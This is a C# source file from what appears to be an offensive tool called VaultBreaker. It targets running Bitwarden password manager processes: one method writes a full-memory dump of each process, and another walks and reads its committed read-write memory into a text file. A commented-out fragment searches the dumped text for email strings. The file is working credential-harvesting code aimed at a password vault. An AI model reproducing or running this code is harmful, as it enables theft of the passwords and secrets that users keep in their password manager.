﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using VaultBreaker.Helpers;
using System.Runtime.Caching;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.IO;

namespace VaultBreaker.Helpers
{
	public class BitWarden
	{
		public static void dumpBitwarden(string outFile)
		{
			//Process[] procs = Process.GetProcessesByName("Bitwarden.exe");
			Process[] procs = Process.GetProcessesByName("BiTWarDen");
			Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);

			foreach (var proc in procs)
			{
				//IntPtr hFile = WinAPI.CreateFileW(outFile + "Bitwarden.DMP", System.IO.FileAccess.ReadWrite, System.IO.FileShare.ReadWrite, IntPtr.Zero, System.IO.FileMode.Create, System.IO.FileAttributes.Normal, IntPtr.Zero);
				//if(hFile == IntPtr.Zero)
				//{
				//	Console.WriteLine("[DEBUG] Something went wrong while writing the file");
				//	Console.ReadKey();
				//}
				//else
				//{
				//	Console.WriteLine("[DEBUG] Got Handle {0}", hFile.ToString());
				//	Console.ReadKey();
				//}
				IntPtr hProc = proc.Handle;
				//Requires writing to file :/
				FileStream fs = null;

				if (File.Exists(outFile + "\\BW.DMP"))
				{
					fs = File.OpenWrite(outFile + "\\BW.DMP");
				}
				else
				{
					fs = File.Create(outFile + "\\BW.DMP");
				}
				using (fs)
				{
					Console.WriteLine("[DEBUG]\r\nhProc {0}\r\nprocID {1}\r\nfs {2}", hProc.ToString(), proc.Id, fs.SafeFileHandle.DangerousGetHandle().ToString());
					Console.ReadKey();
					WinAPI.MiniDumpWriteDump(hProc, (uint)proc.Id, fs.SafeFileHandle.DangerousGetHandle(), WinAPI.MINI_DUMP_TYPE.WithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
				}

				Console.ReadKey();
			}
		}

		public static void dumpBitwarden2(string outfile)
		{
			//Process[] procs = Process.GetProcessesByName("Bitwarden.exe");
			Process[] procs = Process.GetProcessesByName("BiTWarDen");
			Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);

			foreach (var proc in procs)
			{
				//IntPtr hProc = proc.Handle;
				IntPtr hProc = WinAPI.OpenProcess(WinAPI.ProcessAccessFlags.QueryInformation|WinAPI.ProcessAccessFlags.VirtualMemoryRead, false, proc.Id);
				WinAPI.MEMORY_BASIC_INFORMATION64 mbi = new WinAPI.MEMORY_BASIC_INFORMATION64();
				//32 bit
				//WinAPI.MEMORY_BASIC_INFORMATION mbi = new WinAPI.MEMORY_BASIC_INFORMATION()
				WinAPI.SYSTEM_INFO si = new WinAPI.SYSTEM_INFO();
				if(hProc == IntPtr.Zero)
				{
					//Failed.
					Console.WriteLine("Unable to create a connection to the process! Error Code: {0}", WinAPI.GetLastError());
					Environment.Exit(6);
				}
				else
				{
					Console.WriteLine("[DEBUG] Gained handle to process {0}-{1}: {2}", proc.Id, proc.ProcessName, hProc.ToString());
				}

				//Determine memory address range.
				const int PROCESS_QUERY_INFORMATION = 0x0400;
				const int MEM_COMMIT = 0x00001000;
				const int PAGE_READWRITE = 0x04;
				const int PROCESS_WM_READ = 0x0010;




				WinAPI.GetSystemInfo(out si);
				IntPtr hProc_min_addr = si.minimumApplicationAddress;
				IntPtr hProc_max_addr = si.maximumApplicationAddress;
				long hProc_long_min = (long)hProc_min_addr;
				long hProc_long_max = (long)hProc_max_addr;
				StreamWriter sw = new StreamWriter("dump-" + proc.Id + "-" + proc.ProcessName + "-2.txt");

				int bytesRead = 0;

				Console.WriteLine("[DEBUG] hProc_long_min {0}\r\n[DEBUG] hProc_long_max {1}", hProc_long_min, hProc_long_max);
				while (hProc_long_min < hProc_long_max)
				{
					//Console.WriteLine("[DEBUG] Current Min Addr: {0}", hProc_long_min);\
					DebugFunctions.writeDebug("Performing VirtualQueryEx()");
					bytesRead = WinAPI.VirtualQueryEx(hProc, hProc_min_addr, out mbi, (uint)Marshal.SizeOf(typeof(WinAPI.MEMORY_BASIC_INFORMATION64)));
					DebugFunctions.writeDebug("Finished VirtualQueryEx()");
					//if (mbi.Protect == (int)WinAPI.AllocationProtectEnum.PAGE_EXECUTE_READWRITE && mbi.State == WinAPI.StateEnum.MEM_COMMIT)


					Console.WriteLine("mbi.Protect : {0}\r\nmbi.State {1}", mbi.Protect, mbi.State);
					if(mbi.Protect == PAGE_READWRITE && mbi.State == MEM_COMMIT)

					{
						byte[] buffer = new byte[mbi.RegionSize];
						DebugFunctions.writeDebug("Reading Process Memory");
						WinAPI.ReadProcessMemory(hProc, mbi.BaseAddress, buffer, mbi.RegionSize, ref bytesRead);
						Console.WriteLine("[DEBUG] mbi.RegionSize: {0}", mbi.RegionSize);
						for(long i=0; i < mbi.RegionSize; i++)
						{
							//sw.WriteLine("0x{0} : {1}", mbi.BaseAddress + i.ToString("X"), (char)buffer[i]);
							sw.Write((char)buffer[i]);
						}
					}
					else
					{
						if (mbi.Protect == PAGE_READWRITE)
						{
							DebugFunctions.writeDebug("mbi.Protect == PAGE_READWRITE");
						}
						else if (mbi.RegionSize == MEM_COMMIT)
						{
							Console.WriteLine("mbi.RegionSize == MEM_COMMIT");
						}
						else
						{
							DebugFunctions.writeDebug("An error occured: " + WinAPI.GetLastError());
							DebugFunctions.writeDebug("bytesRead: " + bytesRead);
							//DebugFunctions.writeDebug("Exiting, press any key to Continue.");
							//Console.ReadKey();
							//Environment.Exit(24);
						}
					}
					Console.WriteLine("[DEBUG] Finished Memory Location");
					Console.WriteLine("[DEBUG] Adding {0} to hProc_long_min. Current Value: {1}", mbi.RegionSize, hProc_long_min + mbi.RegionSize);
					hProc_long_min += mbi.RegionSize;
					hProc_min_addr = new IntPtr(hProc_long_min);
				}
				sw.Close();

				/**

				if (baseAddress == IntPtr.Zero || modSize == 0)
				{
					Console.WriteLine("Unable to identify the base address for Bitwarden");
					Environment.Exit(0);
				}

				if (strResult.Contains("gmail"))
				{
					int start, end;
					start = strResult.IndexOf("gmail", 0);
					end = start + 100;
					Console.WriteLine(strResult.Substring(start, end - start));
				}
				else
				{
					Console.WriteLine("Didn't Find");
				}
	**/
				//Console.ReadKey();
			}
		}
	}
}
